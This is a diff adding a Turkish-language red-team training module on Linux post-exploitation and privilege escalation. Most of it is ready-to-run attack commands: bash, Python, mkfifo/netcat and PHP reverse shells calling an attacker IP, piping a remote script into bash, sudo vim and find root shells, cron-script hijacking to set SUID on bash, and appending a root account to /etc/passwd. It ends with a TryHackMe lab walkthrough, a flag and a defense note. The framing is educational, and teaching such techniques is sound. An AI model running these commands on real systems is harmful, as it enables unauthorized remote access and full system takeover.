@@ -1,0 +1,220 @@
+{
+  "id": "linux-privesc",
+  "slug": "linux-privesc",
+  "title": "Linux Privilege Escalation",
+  "subtitle": "Erişim Sonrası Linux Yetki Yükseltme",
+  "description": "Hedef Linux sistemde düşük yetkili shell aldıktan sonra root yetkisine nasıl ulaşırsın? Bash reverse shell'den TTY upgrade'e, LinPEAS ile enumeration'dan SUID/Sudo/Cron istismarına kapsamlı Linux post-exploitation rehberi.",
+  "team": "red-team",
+  "category": "Post-Exploitation",
+  "phase": "Post-Exploitation / Privilege Escalation",
+  "icon": "🐧",
+  "color": "#f97316",
+  "tags": ["linux", "privesc", "reverse-shell", "TTY", "SUID", "sudo", "cron", "LinPEAS", "post-exploitation"],
+  "modules": [
+    {
+      "id": "shell-access",
+      "title": "Reverse Shell ve TTY Upgrade",
+      "description": "Hedef sistemde shell aç, kararsız shell'i tam TTY'ye yükselt.",
+      "difficulty": "intermediate",
+      "duration": "60 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Reverse Shell Nedir?",
+          "content": "Reverse shell, hedef sistemin saldırgan makinesine bağlantı açtığı bir shell tekniğidir. Hedef sistemdeki bir RCE (Remote Code Execution) zafiyeti kullanılır.\n\nNeden Reverse Shell? Hedef genellikle firewall arkasındadır. Bind shell (hedef dinler) firewall tarafından engellenir. Reverse shell (hedef bağlanır) ise genellikle outbound trafiğe izin verildiği için geçer.\n\nShell Türleri:\n1. Bash one-liner: Hızlı ama kararsız\n2. Netcat (nc): Klasik, ama bazı sistemlerde yok\n3. Python/Perl/PHP: Dil yorumlayıcısı varsa güvenilir\n4. mkfifo: Named pipe ile stabil shell\n\nÖnemli: Reverse shell payload'ları, hedef sistemde RCE zafiyeti bulunduktan sonra yalnızca yetkili lab ortamlarında (CTF, HackTheBox, TryHackMe) kullanılmalıdır."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Reverse Shell Payload'ları",
+          "commands": [
+            {
+              "command": "nc -lvnp 4444",
+              "description": "Senaryo: Kali makinende netcat listener aç (saldırgan tarafı)",
+              "output": "Listening on 0.0.0.0 4444\nConnection received on 10.10.10.5 49123",
+              "flags": [
+                { "flag": "-l", "description": "Listen mode (dinle)" },
+                { "flag": "-v", "description": "Verbose (bağlantı bilgisini göster)" },
+                { "flag": "-n", "description": "DNS çözümleme yapma" },
+                { "flag": "-p 4444", "description": "Hangi portu dinleyeceği" }
+              ],
+              "tip": "Listener her zaman önce açılmalıdır, sonra payload gönderilir."
+            },
+            {
+              "command": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+              "description": "Senaryo: Hedef sistemde RCE aracılığıyla çalıştırılacak Bash reverse shell",
+              "warning": "Bu komutu YALNIZCA yetkili lab ortamında (CTF makinesi, kendi sisteminiz) çalıştırın.",
+              "tip": "URL encode edilmiş hali (web'den çalıştırma için): bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"
+            },
+            {
+              "command": "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.5\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
+              "description": "Python3 reverse shell — bash yoksa alternatif",
+              "tip": "Python2 için: python -c 'import socket,subprocess,os; ...'"
+            },
+            {
+              "command": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f",
+              "description": "mkfifo ile stabil netcat shell",
+              "tip": "En stabil one-liner reverse shell yöntemlerinden biridir."
+            },
+            {
+              "command": "php -r '$sock=fsockopen(\"10.10.14.5\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+              "description": "PHP reverse shell — web shell üzerinden çalıştır"
+            }
+          ]
+        },
+        {
+          "id": "advanced",
+          "type": "advanced",
+          "title": "TTY Upgrade — Kararsız Shell'i Tam Terminal'e Çevir",
+          "content": "Reverse shell genellikle eksik TTY'de gelir: Ctrl+C uygulamayı öldürür, tab tamamlama çalışmaz, sudo komutları interaktif çalışmaz.\n\nTTY Upgrade Adımları (Sırayla Uygula):",
+          "commands": [
+            {
+              "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+              "description": "Adım 1: Python ile PTY spawn et",
+              "tip": "Python3 yoksa python2 veya script /dev/null -c bash dene."
+            },
+            {
+              "command": "export TERM=xterm",
+              "description": "Adım 2: Terminal tipini ayarla (clear, nano vb. için)"
+            },
+            {
+              "command": "# Ctrl+Z ile shell'i arka plana al, sonra:",
+              "description": "Adım 3: Shell'i arka plana al ve stty ayarını yap",
+              "output": "# Kali terminalinde:\nstty raw -echo; fg\n# Enter'a bas, ardından hedef shell'de:\nreset\nexport SHELL=bash\nstty rows 38 columns 116",
+              "tip": "stty size ile kendi terminal boyutunuzu öğrenin ve hedefte de aynı değerleri girin."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "linux-enum",
+      "title": "Linux Enumeration ve LinPEAS",
+      "description": "Sistemde ne var? Hangi yetki yükseltme vektörleri mevcut?",
+      "difficulty": "intermediate",
+      "duration": "70 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Post-Exploitation Enumeration Neden Kritik?",
+          "content": "Shell aldıktan sonra acele etme. Önce keşif yap:\n- Ben kimim? (id, whoami)\n- Hangi sudoer izinlerim var? (sudo -l)\n- SUID/GUID binary'ler var mı? (find / -perm -4000)\n- Cron job'lar ne yapıyor? (/etc/crontab)\n- Ağda başka erişim noktası var mı? (netstat, ip route)\n- Düz metin parola var mı? (history, config dosyaları)\n\nLinPEAS (Linux Privilege Escalation Awesome Script): Otomatik enumeration yapar, renkli çıktıyla kritik bulguları vurgular."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Manuel ve Otomatik Enumeration",
+          "commands": [
+            {
+              "command": "id && whoami && hostname && uname -a && cat /etc/os-release",
+              "description": "Senaryo: Shell aldıktan ilk bakış — kim ve neredeyim?",
+              "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data\nhedef-linux\nLinux hedef-linux 5.15.0 #1 SMP x86_64 GNU/Linux\nPretty Name: Ubuntu 22.04.2 LTS"
+            },
+            {
+              "command": "sudo -l",
+              "description": "Senaryo: Hangi komutları sudo ile çalıştırabilirim? (privesc için altın madeni)",
+              "output": "(root) NOPASSWD: /usr/bin/vim\n(root) NOPASSWD: /usr/bin/find",
+              "tip": "NOPASSWD: /usr/bin/vim görürsen → vim'den root shell al: sudo vim -c ':!/bin/bash'"
+            },
+            {
+              "command": "find / -perm -4000 -type f 2>/dev/null",
+              "description": "Senaryo: SUID bit set edilmiş binary'leri bul",
+              "output": "/usr/bin/passwd\n/usr/bin/pkexec\n/usr/bin/nmap   ← BU ŞÜPHELİ!\n/bin/su\n/usr/bin/sudo",
+              "tip": "Bulunanları GTFOBins (gtfobins.github.io) üzerinde kontrol et!"
+            },
+            {
+              "command": "cat /etc/crontab && ls -la /etc/cron*",
+              "description": "Senaryo: Cron job'ları incele — yazılabilir script var mı?",
+              "output": "* * * * * root /opt/backup.sh\n\n# Şimdi dosyayı kontrol et:\nls -la /opt/backup.sh\n-rwxrwxrwx 1 root root 50 Jan 15 /opt/backup.sh  ← HERKES YAZABİLİR!"
+            },
+            {
+              "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+              "description": "Senaryo: LinPEAS'ı indirip çalıştır (internet erişimi varsa)",
+              "tip": "İnternet yoksa: Kali'den HTTP server aç (python3 -m http.server 80) ve hedefte wget/curl ile indir.",
+              "warning": "LinPEAS agresif enumeration yapar ve loglanabilir. CTF ortamında sorun değil."
+            },
+            {
+              "command": "find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys",
+              "description": "Senaryo: Yazılabilir dosyaları bul — PATH injection veya config dosyası değiştirme",
+              "output": "/tmp/backup.sh\n/opt/monitor.sh\n/etc/passwd    ← Kritik! /etc/passwd yazılabilirse root ekle"
+            },
+            {
+              "command": "history && cat ~/.bash_history",
+              "description": "Senaryo: Geçmiş komutlarda şifre veya anahtar ara",
+              "output": "mysql -u root -pMy$ecretP@ssw0rd\nscp admin@10.0.0.1:/etc/shadow /tmp/\nssh -i id_rsa admin@10.10.10.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "linux-exploits",
+      "title": "SUID, Sudo ve Cron İstismarı",
+      "description": "GTFOBins teknikleri, sudo bypass ve cron job hijacking ile root al.",
+      "difficulty": "advanced",
+      "duration": "90 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "PrivEsc Teknikleri",
+          "commands": [
+            {
+              "command": "sudo vim -c ':!/bin/bash'",
+              "description": "Senaryo: Sudo listesinde vim varsa → root shell",
+              "output": "root@hedef:/# id\nuid=0(root) gid=0(root) groups=0(root)",
+              "tip": "GTFOBins'te vim için birden fazla teknik var. vim yerine nano, less, more da çalışır."
+            },
+            {
+              "command": "sudo find /tmp -exec /bin/bash \\;",
+              "description": "Senaryo: Sudo listesinde find varsa → root shell",
+              "tip": "find, exec parametresiyle herhangi bir komut çalıştırır."
+            },
+            {
+              "command": "# /usr/bin/nmap SUID varsa:\nnmap --interactive\nnmap> !sh",
+              "description": "Senaryo: SUID nmap (eski sürüm) → interactive mode ile root shell"
+            },
+            {
+              "command": "# /etc/crontab'da root'un çalıştırdığı script yazılabilirse:\necho 'chmod +s /bin/bash' >> /opt/backup.sh\n# Bir sonraki cron döngüsünü bekle, ardından:\n/bin/bash -p",
+              "description": "Senaryo: Cron job hijacking — root cron'unun çağırdığı script'e reverse shell ekle",
+              "warning": "Bu teknik sistemde kalıcı değişiklik bırakır. CTF bitiminde geri al."
+            },
+            {
+              "command": "openssl passwd -1 -salt xyz hacked123",
+              "description": "Senaryo: /etc/passwd yazılabilirse — yeni root kullanıcısı ekle",
+              "output": "$1$xyz$AbC123...\n\n# Sonra /etc/passwd'a ekle:\necho 'hacker:$1$xyz$AbC123...:0:0::/root:/bin/bash' >> /etc/passwd\nsu hacker"
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: TryHackMe — Linux PrivEsc",
+          "scenario": {
+            "title": "www-data'dan root'a — Tam PrivEsc Zinciri",
+            "objective": "Web shell aracılığıyla www-data shell al, LinPEAS ile enum yap, SUID binary veya sudo zafiyetini bul ve root.txt flag'ini oku.",
+            "environment": "TryHackMe — Linux PrivEsc Room / 10.10.x.x",
+            "difficulty": "intermediate",
+            "steps": [
+              "Web uygulamasında RCE bul veya upload zafiyetiyle PHP web shell yükle",
+              "Reverse shell al: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+              "TTY upgrade: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' → Ctrl+Z → stty raw -echo; fg",
+              "LinPEAS çalıştır: curl -L https://...linpeas.sh | bash",
+              "sudo -l çıktısını incele — NOPASSWD var mı?",
+              "find / -perm -4000 2>/dev/null | xargs ls -la — GTFOBins'te ara",
+              "Root shell aldıktan sonra: cat /root/root.txt"
+            ],
+            "hints": [
+              "sudo -l çıktısında awk, python, perl, find — hepsinin GTFOBins tekniği var",
+              "SUID /usr/bin/python3 → python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+              "Cron job'larda * * * * * root /opt/xxx.sh → dosya yazılabilir mi?"
+            ],
+            "flag": "THM{linux_privesc_r00t}",
+            "defenseNote": "Savunma: sudo'yu en az yetki prensibine göre yapılandırın. SUID bit'ini gereksiz binary'lerden kaldırın: chmod u-s /usr/bin/vim. Cron job scriptlerinin sahibini ve izinlerini kontrol edin: chmod 700 /opt/backup.sh. auditd ile SUID kullanımını ve privilege escalation girişimlerini logla."
+          }
+        }
+      ]
+    }
+  ]
+}
